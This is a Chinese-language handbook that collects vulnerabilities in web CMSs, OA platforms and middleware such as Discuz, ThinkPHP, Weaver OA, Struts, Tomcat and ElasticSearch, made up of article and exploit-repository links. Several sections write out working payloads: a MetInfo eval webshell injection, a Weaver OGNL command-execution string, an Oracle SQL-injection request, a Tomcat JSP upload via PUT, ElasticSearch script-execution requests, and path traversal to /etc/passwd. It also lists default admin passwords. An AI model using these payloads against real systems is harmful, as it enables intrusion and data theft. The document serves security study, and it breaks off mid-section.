# web 服务和中间件 vul 整合

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

**文章**
- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)

**工具**
- [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter)
- [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework)
- [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword)

---

# 各类论坛/CMS框架

**什么是内容管理系统 (CMS) **

内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在您的网站上提供的软件。 它有助于编辑,发布和修改网站的内容。

## dedeCMS
**文章**
- [解决DEDECMS历史难题--找后台目录](https://xz.aliyun.com/t/2064)

---

## Discuz
### Discuz
**文章**
- [Discuz!X 前台任意文件删除漏洞深入解析](https://xz.aliyun.com/t/34)
- [Discuz!因Memcached未授权访问导致的RCE](https://xz.aliyun.com/t/2018)
- [Discuz!X 个人账户删除漏洞](https://xz.aliyun.com/t/2297)
- [Discuz!x3.4后台文件任意删除漏洞分析](https://xz.aliyun.com/t/4725)
- [DiscuzX v3.4 排行页面存储型XSS漏洞 分析](https://xz.aliyun.com/t/2899)

**CVE-2018-14729**
- 影响范围
    - Discuz! 1.5-2.5

- 文章
    - [Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)](https://paper.seebug.org/763/)

- POC | Payload | exp
    - [FoolMitAh/CVE-2018-14729](https://github.com/FoolMitAh/CVE-2018-14729)

### Discuz!ML
**工具**
- [theLSA/discuz-ml-rce](https://github.com/theLSA/discuz-ml-rce)

**CVE-2019-13956**
- 文章
    - [Discuz! ML远程代码执行(CVE-2019-13956)](https://www.cnblogs.com/yuzly/p/11386755.html)
    - [Discuz!ML V3.X 代码注入分析 ](https://xz.aliyun.com/t/5638)

---

## Drupal
**CVE-2017-6920 Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞**
- 简述

    2017年6月21日,Drupal 官方发布了一个编号为 CVE-2017- 6920 的漏洞,影响为 Critical。这是 Drupal Core 的 YAML 解析器处理不当所导致的一个远程代码执行漏洞,影响 8.x 的 Drupal Core。

- 文章
    - [CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造](https://paper.seebug.org/334/)
    - [Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞 (CVE-2017-6920) ](https://vulhub.org/#/environments/drupal/CVE-2017-6920/)

---

## ECshop

ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性化网上商店。系统是基于 PHP 语言及 MYSQL 数据库构架开发的跨平台开源程序。

**ECShop 2.x/3.x SQL 注入/任意代码执行漏洞**
- 简述

    其2017年及以前的版本中,存在一处 SQL 注入漏洞,通过该漏洞可注入恶意数据,最终导致任意代码执行漏洞。其 3.6.0 最新版已修复该漏洞。

- 文章
    - [ECShop 2.x/3.x SQL注入/任意代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md)

---

## Joomla
**工具**
- [rezasp/joomscan](https://github.com/rezasp/joomscan)

---

## MetInfo

- 官网: https://www.metinfo.cn/

**CVE-2018-13024**
- 简介

    远程攻击者可通过向 admin/column/save.php 文件发送 `module` 参数利用该漏洞向 .php 文件写入代码并执行该代码。

- 文章
    - [CVE-2018-13024复现及一次简单的内网渗透](https://www.freebuf.com/news/193748.html)

- POC | Payload | exp

    - `admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[1]);/*`

---

## ThinkCMF
**ThinkCMF_getshell**
- POC | Payload | exp
    - [jas502n/ThinkCMF_getshell](https://github.com/jas502n/ThinkCMF_getshell)

---

## ThinkPHP
### <5
**文章**
- [thinkphp一些版本的通杀漏洞payload](http://www.moonsec.com/post-853.html)
- [代码审计 | ThinkPHP3.x、5.x框架任意文件包含](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=39586)
- [Thinkphp2.1爆出重大安全漏洞](https://www.cnblogs.com/milantgh/p/3639178.html)
- [ThinkPHP3.2.3框架实现安全数据库操作分析](https://xz.aliyun.com/t/79)
- [ThinkPHP-漏洞分析集合 ](https://xz.aliyun.com/t/2812)
- [ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)](https://xz.aliyun.com/t/2629)
- [ Thinkphp框架 3.2.x sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38901-1-12.html)

### 5
**文章**
- [ThinkPHP 5.x (v5.0.23及v5.1.31以下版本) 远程命令执行漏洞利用 (GetShell) ](https://www.vulnspy.com/cn-thinkphp-5.x-rce/)
- [代码审计 | ThinkPHP3.x、5.x框架任意文件包含](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=39586)
- [ThinkPHP 5.0.x、5.1.x、5.2.x 全版本远程命令执行漏洞](https://blog.csdn.net/csacs/article/details/86668057)
- [ThinkPHP v5.1.22曝出SQL注入漏洞](https://nosec.org/home/detail/1821.html)
- [ThinkPHP-漏洞分析集合 ](https://xz.aliyun.com/t/2812)
- [ThinkPHP 5.1.x SQL注入漏洞分析](https://www.freebuf.com/vuls/185420.html)
- [ThinkPHP框架 < 5.0.16 sql注入漏洞分析](https://bbs.ichunqiu.com/thread-38284-1-13.html)
- [ThinkPHP 5.x 远程命令执行漏洞利用过程](https://laucyun.com/a9142c328b103cd86a3715bd5073c4be.html)

**工具**
- [SkyBlueEternal/thinkphp-RCE-POC-Collection](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection)

**资源**
- [Mochazz/ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln)

---

## YxCMS

- 官网: http://www.yxcms.net/index.html

**常见路径**
```
/index.php?r=admin  # 后台  默认管理员账号密码 admin 123456
```

**YxCMS 1.4.7 多个漏洞**
- 文章
    - [YxCMS 1.4.7 最新版漏洞分析](https://bbs.ichunqiu.com/thread-45926-1-1.html)

---

## zcncms
**文章**
- [zcncms多个漏洞-Musec](http://musec.lofter.com/post/303379_d39f0c)
- [ZCNCMS审计及漏洞分析](https://www.anquanke.com/post/id/179782)
- [代码审计——zcncms后台SQL注入(一) ](http://0day5.com/archives/4053/)
- [代码审计——zcncms几处漏洞合集(二) ](http://0day5.com/archives/4062/)

---

## 泛微
**e-mobile < 6.5 Ognl 表达式注入**
- 文章
    - [关于表达式注入的小记录](https://zhuanlan.zhihu.com/p/26052235)
    - [泛微 E-Mobile Ognl 表达式注入](https://blog.csdn.net/qq_27446553/article/details/68203308)
    - [泛微 E-Mobile Ognl 表达式注入](https://docs.ioin.in/writeup/www.sh0w.top/_index_php_archives_14_/index.html)

- POC | Payload | exp
    ```
    message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
    ```

**e-cology OA Beanshell 组件远程代码执行**
- 文章
    - [[漏洞预警]泛微e-cology OA Beanshell组件远程代码执行分析](https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg)
    - [泛微e-cology OA Beanshell组件远程代码执行漏洞复现](https://mp.weixin.qq.com/s/LpXiLukOKMfMSa8gUYBqNA)

- POC | Payload | exp
    - [jas502n/e-cology](https://github.com/jas502n/e-cology)
    ```
    /weaver/bsh.servlet.BshServlet
    ```

**泛微 OA WorkflowCenterTreeData 接口注入漏洞(限 oracle 数据库)**
- POC | Payload | exp
    ```
    POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
    Host: ip:port
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 2236
    Connection: close
    Upgrade-Insecure-Requests: 1

    formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1
    ```

**泛微ecology OA系统接口存在数据库配置信息泄露漏洞**
- POC | Payload | exp
    - [jas502n/DBconfigReader](https://github.com/jas502n/DBconfigReader)

---

## 致远 OA
**A8-OA-seeyon-RCE**
- 文章
    - [致远A8协同办公系统poc/seeyon 0day](https://www.jianshu.com/p/562f45edde2d)

- POC | Payload | exp
    - [RayScri/A8-OA-seeyon-RCE](https://github.com/RayScri/A8-OA-seeyon-RCE)

---

# 框架和中间件
**toolkit**
- [hatRiot/clusterd](https://github.com/hatRiot/clusterd)
- [matthiaskaiser/jmet](https://github.com/matthiaskaiser/jmet) - Java Message Exploitation Tool

## ActiveMQ

Apache ActiveMQ 是美国阿帕奇 (Apache) 软件基金会所研发的一套开源的消息中间件,它支持Java消息服务、集群、Spring Framework 等。

**CVE-2015-5254 ActiveMQ 反序列化漏洞**
- 简述

    Apache ActiveMQ 5.13.0 之前 5.x 版本中存在安全漏洞,该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的 Java Message Service(JMS)ObjectMessage 对象利用该漏洞执行任意代码。

- 文章
    - [ActiveMQ 反序列化漏洞 (CVE-2015-5254) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

**CVE-2016-3088 ActiveMQ 任意文件写入漏洞**
- 简述

    ActiveMQ 的 web 控制台分三个应用,admin、api 和 fileserver,其中 admin 是管理员页面,api 是接口,fileserver 是储存文件的接口；admin 和 api 都需要登录后才能使用,fileserver无需登录。

    fileserver 是一个 RESTful API 接口,我们可以通过 GET、PUT、DELETE 等 HTTP 请求对其中存储的文件进行读写操作,其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷,但后来发现：
    - 其使用率并不高
    - 文件操作容易出现漏洞

    所以,ActiveMQ 在 5.12.x~5.13.x 版本中,已经默认关闭了 fileserver 这个应用 (你可以在 conf/jetty.xml 中开启之) ；在 5.14.0 版本以后,彻底删除了 fileserver应用。

- 文章
    - [ActiveMQ任意文件写入漏洞 (CVE-2016-3088) ](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md)

---

## Apache shiro
**Shiro RememberMe 1.2.4 反序列化漏洞(SHIRO-550)**
- POC | Payload | exp
    - [jas502n/SHIRO-550](https://github.com/jas502n/SHIRO-550)

---

## Apache Solr

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发,主要基于 HTTP 和 Apache Lucene 实现。

**资源**
- [artsploit/solr-injection: Apache Solr Injection Research](https://github.com/artsploit/solr-injection)

**CVE-2017-12629 Apache solr XML 实体注入漏洞**
- 简介

    原理大致是文档通过 Http 利用 XML 加到一个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞 (XXE) 和远程命令执行漏洞 (RCE) ,二者可以连接成利用链,编号均为 CVE-2017-12629。

- 文章
    - [Apache solr XML 实体注入漏洞 (CVE-2017-12629) ](https://vulhub.org/#/environments/solr/CVE-2017-12629-XXE/)
    - [Apache Solr 远程命令执行漏洞 (CVE-2017-12629) ](https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/)

**CVE-2019-0192 Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5**
- POC | Payload | exp
    https://github.com/mpgn/CVE-2019-0192/

**CVE-2019-0193 Apache Solr 远程命令执行漏洞**
- 简介

    此次漏洞出现在 Apache Solr 的 DataImportHandler,该模块是一个可选但常用的模块,用于从数据库和其他源中提取数据。它具有一个功能,其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本,因此攻击者可以通过构造危险的请求,从而造成远程命令执行。

- 文章
    - [Apache Solr 远程命令执行漏洞 (CVE-2019-0193) ](https://vulhub.org/#/environments/solr/CVE-2019-0193/)

**Apache Solr Velocity模版注入远程命令执行漏洞**
- 影响版本
    - 影响 Apache Solr 8.1.1 到 8.2.0 版本。

- 文章
    - [Apache Solr最新漏洞复现](https://xz.aliyun.com/t/6679)

---

## Apache Spark

Apache Spark 是一款集群计算系统,其支持用户向管理节点提交应用,并分发给集群执行。

**未授权访问漏洞**
- 简介

    如果管理节点未启动 ACL (访问控制) ,我们将可以在集群中执行任意代码。

- 文章
    - [Apache Spark 未授权访问漏洞](https://vulhub.org/#/environments/spark/unacc/)

---

## Apache Struts
**工具**
- [Lucifer1993/struts-scan](https://github.com/Lucifer1993/struts-scan) - Python2 编写的 struts2 漏洞全版本检测和利用工具
- [HatBoy/Struts2-Scan](https://github.com/HatBoy/Struts2-Scan) - Python3 Struts2 全漏洞扫描利用工具
- [shack2/Struts2VulsTools](https://github.com/shack2/Struts2VulsTools)

**环境搭建**
- [wh1t3p1g/Struts2Environment](https://github.com/wh1t3p1g/Struts2Environment)
- [sie504/Struts-S2-xxx](https://github.com/sie504/Struts-S2-xxx)
- [shengqi158/S2-055-PoC](https://github.com/shengqi158/S2-055-PoC)

**文章**
- [Struts2 历史 RCE 漏洞回顾不完全系列](http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/)

**S2-016 & CVE-2013-2251**

**S2-020 & CVE-2014-0094 & CNNVD-201403-191**

**S2-045 & CVE-2017-5638**
- 简介

    恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞进而执行系统命令。

- POC | Payload | exp
    - [tengzhangchao/Struts2_045-Poc](https://github.com/tengzhangchao/Struts2_045-Poc)
    - [iBearcat/S2-045](https://github.com/iBearcat/S2-045)

**S2-046 & CVE-2017-5638**

- 简介

    该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息,导致远程攻击者可通过修改 HTTP 请求头中的 Content-Type 值,构造发送恶意的数据包,利用该漏洞进而在受影响服务器上执行任意系统命令。

- 修复方案
    1. 官方已经发布版本更新,尽快升级到不受影响的版本(Struts 2.3.32 或 Struts 2.5.10.1),建议在升级前做好数据备份。
    2. 临时修复方案
    在用户不便进行升级的情况下,作为临时的解决方案,用户可以进行以下操作来规避风险：在 WEB-INF/classes 目录下的 struts.xml 中的 struts 标签下添加
    `<constant name="struts.custom.i18n.resources" value="global" />`
    在 WEB-INF/classes/ 目录下添加 global.properties,文件内容如下：
    `struts.messages.upload.error.InvalidContentTypeException=1`

- POC | Payload | exp
    - [mazen160/struts-pwn](https://github.com/mazen160/struts-pwn)

**S2-048 & CVE-2017-9791**
- POC | Payload | exp
    - [dragoneeg/Struts2-048](https://github.com/dragoneeg/Struts2-048)

**S2-052 & CVE-2017-9805**
- POC | Payload | exp
    - [mazen160/struts-pwn_CVE-2017-9805](https://github.com/mazen160/struts-pwn_CVE-2017-9805)

**S2-053 & CVE-2017-12611**
- POC | Payload | exp
    - [brianwrf/S2-053-CVE-2017-12611](https://github.com/brianwrf/S2-053-CVE-2017-12611)

**S2-055 & CVE-2017-7525**
- POC | Payload | exp
    - [iBearcat/S2-055](https://github.com/iBearcat/S2-055)

**S2-056 & CVE-2018-1327**
- POC | Payload | exp
    - [ iBearcat/S2-056-XStream](https://github.com/iBearcat/S2-056-XStream)

**S2-057 & CVE-2018-11776**

- 简介

    该漏洞由 Semmle Security Research team 的安全研究员 Man YueMo 发现。该漏洞是由于在 Struts2 开发框架中使用 namespace 功能定义 XML 配置时,namespace 值未被设置且在上层动作配置(Action Configuration)中未设置或用通配符 namespace,可能导致远程代码执行。

- POC | Payload | exp
    - [Ivan1ee/struts2-057-exp](https://github.com/Ivan1ee/struts2-057-exp)

---

## Apache Tomcat

Tomcat 默认端口为 8080,也可能被改为其他端口,后台管理路径为 `/manager/html`,后台默认弱口令 admin/admin、tomcat/tomcat 等,若果配置不当,可通过”Tomcat Manager”连接部署 war 包的方式获取 webshell。

**文章**
- [Tomcat漏洞详解](http://www.mottoin.com/detail/389.html)

**CVE-2017-12615/12616**
- 简介

    2017年9月19日,Apache Tomcat 官方确认并修复了两个高危漏洞,漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0-7.80之间,官方评级为高危,在一定条件下,攻击者可以利用这两个漏洞,获取用户服务器上 JSP 文件的源代码,或是通过精心构造的攻击请求,向用户服务器上传恶意 JSP 文件,通过上传的 JSP 文件 ,可在用户服务器上执行任意代码,从而导致数据泄露或获取服务器权限,存在高安全风险。

    - CVE-2017-12615：远程代码执行漏洞

        当 Tomcat 运行在 Windows 操作系统时,且启用了 HTTP PUT 请求方法 (例如,将 readonly 初始化参数由默认值设置为 false) ,攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件,JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。

    - CVE-2017-12616：信息泄露漏洞

        当 Tomcat 中启用了 VirtualDirContext 时,攻击者将能通过发送精心构造的恶意请求,绕过设置的相关安全限制,或是获取到由 VirtualDirContext 提供支持资源服务的 JSP 源代码,从而造成代码信息泄露。

- 漏洞利用条件

    - CVE-2017-12615 漏洞利用需要在 Windows 环境,且需要将 readonly 初始化参数由默认值设置为 false,经过实际测试,Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数,需要手工添加,默认配置条件下不受此漏洞影响。

    - CVE-2017-12616 漏洞需要在 server.xml 文件配置 VirtualDirContext 参数,经过实际测试,Tomcat 7.x 版本内默认配置无 VirtualDirContext 参数,需要手工添加,默认配置条件下不受此漏洞影响。

- 影响版本

    - CVE-2017-12615影响范围：Apache Tomcat 7.0.0 - 7.0.79 (windows环境)
    - CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80

- 文章
    - [CVE-2017-12615/CVE-2017-12616:Tomcat信息泄漏和远程代码执行漏洞分析报告](https://paper.seebug.org/399/)

- POC | Payload | exp

    - [iBearcat/CVE-2017-12615](https://github.com/iBearcat/CVE-2017-12615)
    - [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)

    ```
    PUT /1.jsp/ HTTP/1.1
    Host: your-ip:8080
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5

    <% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>
    ```

**CVE-2017-12617**
- 文章
    - [CVE-2017-12617-Tomcat远程代码执行漏洞复现测试](https://www.freebuf.com/vuls/150203.html)

- POC | Payload | exp
    - [cyberheartmi9/CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)

- MSF 模块
    ```
    use exploit/multi/http/tomcat_jsp_upload_bypass
    ```

**CVE-2019-0232**
- 文章
    - [CVE-2019-0232：Apache Tomcat RCE漏洞分析](https://xz.aliyun.com/t/4875)

- POC | Payload | exp
    - [pyn3rd/CVE-2019-0232](https://github.com/pyn3rd/CVE-2019-0232)
    - [jas502n/CVE-2019-0232](https://github.com/jas502n/CVE-2019-0232)

---

## ElasticSearch

ElasticSearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎,基于 RESTful web 接口。Elasticsearch 是用 Java 开发的,并作为 Apache 许可条款下的开放源码发布,是当前流行的企业级搜索引擎。

**未授权访问漏洞**

- `http://<ip>:9200`

**CVE-2014-3120 ElasticSearch 命令执行漏洞**

- 简述

    -老版本 ElasticSearch 支持传入动态脚本 (MVEL) 来执行一些复杂的操作,而 MVEL 可执行 Java 代码,而且没有沙盒,所以我们可以直接执行任意代码。

- POC | Payload | exp

    来源: [ElasticSearch 命令执行漏洞 (CVE-2014-3120) 测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/)

    首先,该漏洞需要 es 中至少存在一条数据,所以我们需要先创建一条数据：
    ```
    POST /website/blog/ HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25

    {
    "name": "test"
    }
    ```

    然后,执行任意代码：
    ```
    POST /_search?pretty HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 343

    {
        "size": 1,
        "query": {
        "filtered": {
            "query": {
            "match_all": {
            }
            }
        }
        },
        "script_fields": {
            "command": {
                "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }
    }
    ```

**CVE-2015-1427 Groovy 沙盒绕过 && 代码执行漏洞**

- 文章
    - [Remote Code Execution in Elasticsearch - CVE-2015-1427](https://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/)

- POC | Payload | exp

    来源: [ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞 (CVE-2015-1427) 测试环境](https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/)

    由于查询时至少要求es中有一条数据,所以发送如下数据包,增加一个数据：
    ```
    POST /website/blog/ HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25

    {
    "name": "test"
    }
    ```

    然后发送包含 payload 的数据包,执行任意命令：
    ```
    POST /_search?pretty HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/text
    Content-Length: 156

    {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
    ```

**CVE-2015-3337 目录穿越漏洞**

- 影响版本

    - 1.4.5 以下/1.5.2 以下

- 简述

    在安装了具有“site”功能的插件以后,插件目录使用../即可向上跳转,导致目录穿越漏洞,可读取任意文件。没有安装任意插件的 elasticsearch 不受影响。

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/

    `http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd` (不要在浏览器访问)

    `http://your-ip:9200/_plugin/head/`

**CVE-2015-5531**

- 简述

    elasticsearch 1.5.1 及以前,无需任何配置即可触发该漏洞。之后的新版,配置文件 elasticsearch.yml 中必须存在 path.repo,该配置值为一个目录,且该目录必须可写,等于限制了备份仓库的根位置。不配置该值,默认不启动这个功能。

- 影响版本

    - 1.6.1 以下

- 文章
    - [Elasticsearch目录遍历漏洞 (CVE-2015-5531) 复现与分析 (附PoC) ](https://www.freebuf.com/vuls/99942.html)

- POC | Payload | exp

    来源: https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/

    新建一个仓库
    ```
    PUT /_snapshot/test HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 108

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test"
        }
    }
    ```

    创建一个快照
    ```
    PUT /_snapshot/test2 HTTP/1.1
    Host: your-ip:9200
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 108

    {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
        }
    }
    ```

    目录穿越读取任意文件

    `http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

    在错误信息中包含文件内容 (编码后) ,对其进行解码即可获得文件

---

## IIS
**IIS shortname**

windows 在创建一个新文件时,操作系统还会生成 8.3 格式的兼容 MS-DOS 的(短)文件名,以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。

- 文章
    - [IIS短文件名漏洞](http://www.lonelyor.org/lonelyorWiki/15446866501207.html)
    - [IIS短文件名泄露漏洞修复](https://segmentfault.com/a/1190000006225568)
    - [IIS短文件/文件夹漏洞(汇总整理) ](https://www.freebuf.com/articles/4908.html)

- 修复方案
    1. 升级 .net framework 至 4.0 版本或以上
    2. 修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem
    值 NtfsDisable8dot3NameCreation 为 1

- 示例
    ```bash
    1. http://www.xxx.com/*~1*/.aspx
    2. http://www.xxx.com/l1j1e*~1*/.aspx
    # 若1返回404而2返回400,则可以判断目标站点存在漏洞。
    http://www.xxx.com/a*~1*/.aspx
    # 若存在将返回404,不存在则返回400。以此类推,不断向下猜解所有的6个字符。
    ```
    ```
    Windows Server 2008 R2
